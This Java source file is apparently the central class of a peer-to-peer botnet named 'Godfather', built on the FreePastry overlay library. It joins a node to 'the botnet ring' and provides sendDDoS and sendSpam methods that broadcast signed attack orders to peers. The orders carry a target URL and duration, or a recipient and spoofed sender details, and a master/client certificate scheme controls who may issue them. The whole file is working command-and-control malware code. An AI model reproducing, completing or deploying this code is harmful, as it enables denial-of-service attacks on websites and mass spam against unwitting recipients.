package godfather;

import godfather.bootstrap.BootstrapPeersList;
import godfather.communication.CommunicationAPI;
import godfather.localCommunication.PeersMsg;
import godfather.localCommunication.PeersMsgTypes;
import godfather.security.GodSecurityManager;

import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetSocketAddress;

import org.apache.log4j.Logger;

import rice.environment.Environment;
import rice.pastry.NodeIdFactory;
import rice.pastry.PastryNode;
import rice.pastry.PastryNodeFactory;
import rice.pastry.socket.SocketPastryNodeFactory;
import rice.pastry.standard.RandomNodeIdFactory;


public class Godfather {
    static Logger logger = Logger.getLogger(Godfather.class);

    // Loads pastry settings
    private final Environment env = new Environment();
    private PastryNode pastryNode;
    private final BootstrapPeersList peersList;

    private final GodSecurityManager GodSecurityManager;
    private CommunicationAPI communicationAPI;
    private final PeerType peerType;

    public Godfather(PeerType type, String bindPort, String bootstrapIP, String bootstrapPort, BootstrapPeersList listOfPeersStillOk) throws Exception {
        this.peersList = listOfPeersStillOk;
        this.peerType = type;
        this.GodSecurityManager = new GodSecurityManager(type);

        logger.info("bindPort: " + bindPort + " ip: " + bootstrapIP + " bootstrapPort: " + bootstrapPort);
        PastrybootStrap(bindPort, bootstrapIP, bootstrapPort);
    }

    private void PastrybootStrap(String bindPortS, String bootstrapIP, String bootstrapPort) throws IOException, InterruptedException {
        // disable the UPnP setting (in case you are testing this on a NATted LAN)
        env.getParameters().setString("nat_search_policy", "never");

        // the port to use locally
        int bindport = Integer.parseInt(bindPortS);

        // build the bootaddress from the command line args
        Inet4Address bootaddr = (Inet4Address) Inet4Address.getByName(bootstrapIP);
        int bootport = Integer.parseInt(bootstrapPort);
        InetSocketAddress bootaddress = new InetSocketAddress(bootaddr, bootport);

        // Generate the Node Id Randomly
        NodeIdFactory nidFactory = new RandomNodeIdFactory(env);
        PastryNodeFactory factory = new SocketPastryNodeFactory(nidFactory, bindport, env);
        // construct a node, but this does not cause it to boot
        pastryNode = factory.newNode();

        // Start the Apps
        startModulus();

        pastryNode.boot(bootaddress);

        // the node may require sending several messages to fully boot into the ring
        synchronized (pastryNode) {
            while (!pastryNode.isReady() && !pastryNode.joinFailed()) {
                // delay so we don't busy-wait
                pastryNode.wait(200);

                // abort if can't join
                if (pastryNode.joinFailed()) {
                    logger.warn("Could not join the botnet");
                    throw new IOException("Could not join the botnet ring.");
                }
            }
        }

        communicationAPI.start();
        logger.debug("Finished creating new node " + pastryNode);
    }

    private void startModulus() {
        this.communicationAPI = new CommunicationAPI(this);
    }





    // ##########################################################################
    // API to Send Commands
    // ##########################################################################

    public void sendDDoS(String targetURL, int numberOfThreads, long duration) throws Exception {
        logger.info("Send DDoS");
        String order = targetURL + "#" + duration;
        sendAttack(PeersMsgTypes.DDoS, order);

    }


    public void sendSpam(String destination, String source, String sourceFullName, String subject, String message) throws Exception {
        logger.info("Send Spam to: " + destination);
        String order = destination + "#" + source + "#" + sourceFullName + "#" + subject + "#" + message;

        sendAttack(PeersMsgTypes.Spam, order);
    }





    public void sendAttack(PeersMsgTypes type, String order) throws Exception {
        long nounce = getGodSecurityManager().getCertificateManager().getMasterNounce();
        logger.info("With Nounce: " + nounce);

        PeersMsg msg = new PeersMsg(type, order, nounce);

        switch (peerType) {
        case client:
            msg.clientCertificate = getGodSecurityManager().getCertificateManager().getCertificate();
            // NO Break, go sign
        case master:
            // Sign this message
            msg.signMessage(getGodSecurityManager().getCertificateManager().getPrivateKey());
            break;
        default:
            logger.info("Operation not allowed");
            return;
        }
        getCommunicationAPI().broadcastCommand(msg);
    }





    /********************************************************************
     * Get & Set *
     *******************************************************************/

    public Environment getEnv() {
        return env;
    }

    public PastryNode getPastryNode() {
        return pastryNode;
    }


    public GodSecurityManager getGodSecurityManager() {
        return GodSecurityManager;
    }



    /**
     * Return true if this node is a Relay
     */
    public boolean isRelay() {
        return peerType == PeerType.relay;
    }

    public BootstrapPeersList getBootStrapList() {
        return peersList;
    }

    public PeerType getBotType() {
        return peerType;
    }

    public void createClientCertificate(String clientName) throws Exception {
        if (peerType != PeerType.master) {
            throw new Exception("You are not the Master, therefore you cannot Generate Certificates");
        }
        getGodSecurityManager().getCertificateManager().createClientCertificateAndKeys(clientName);
    }

    public CommunicationAPI getCommunicationAPI() {
        return communicationAPI;
    }

    public void setCommunicationAPI(CommunicationAPI communicationAPI) {
        this.communicationAPI = communicationAPI;
    }








}
